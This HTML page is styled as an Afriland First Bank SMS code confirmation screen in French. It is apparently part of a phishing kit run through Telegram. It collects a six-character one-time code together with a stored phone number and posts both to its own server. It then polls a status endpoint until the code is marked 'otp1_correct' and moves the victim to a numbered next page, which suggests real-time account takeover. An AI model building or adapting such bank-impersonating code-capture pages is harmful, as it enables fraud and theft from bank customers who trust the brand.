<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Afriland First Bank - Validation SMS</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --purple-primary: #6b21a8; }
        body { background-color: #f3f4f6; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .header-box { width: 100%; background: var(--purple-primary); padding: 30px; color: white; text-align: center; font-size: 24px; font-weight: 800; }
        .card { background: white; width: 90%; max-width: 400px; padding: 30px 20px; border-radius: 16px; margin-top: -20px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
        .code-input-container { display: flex; justify-content: space-between; gap: 6px; margin: 20px 0; }
        .code-box { width: 48px; height: 54px; border: 2px solid var(--purple-primary); border-radius: 10px; text-align: center; font-size: 20px; font-weight: 800; }
        .submit-btn { width: 100%; background-color: #e5e7eb; color: #9ca3af; border: none; padding: 16px; border-radius: 10px; font-weight: 800; cursor: not-allowed; text-transform: uppercase; }
        .submit-btn.active { background-color: var(--purple-primary); color: white; cursor: pointer; }
    </style>
</head>
<body>
<div class="header-box">Afriland First Bank</div>

<div class="card">
    <h2>Code de Confirmation</h2>
    <p style="font-size: 14px; color: #6b7280; margin-bottom: 20px;">Entrez le code reçu par SMS sur votre téléphone.</p>

    <div class="code-input-container">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
    </div>

    <button id="submitBtn" class="submit-btn" disabled>Valider</button>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const codeBoxes = document.querySelectorAll('.code-box');
    const submitBtn = document.getElementById('submitBtn');
    const savedPhone = localStorage.getItem('phone');

    codeBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.toUpperCase();
            if (box.value && index < codeBoxes.length - 1) codeBoxes[index + 1].focus();
            const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
            submitBtn.disabled = fullCode.length < 6;
            submitBtn.classList.toggle('active', fullCode.length === 6);
        });
    });

    submitBtn.addEventListener('click', async () => {
        const codeValue = Array.from(codeBoxes).map(b => b.value).join('');
        const res = await fetch('/api/verify-first-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: savedPhone, code: codeValue })
        });
        const data = await res.json();
        if (data.success) {
            setInterval(async () => {
                const statusRes = await fetch(`/api/check-status?phone=${savedPhone}`);
                const statusData = await statusRes.json();
                if (statusData.status === "otp1_correct") {
                    window.location.href = "/page9";
                }
            }, 2000);
        }
    });
});
</script>
</body>
</html>
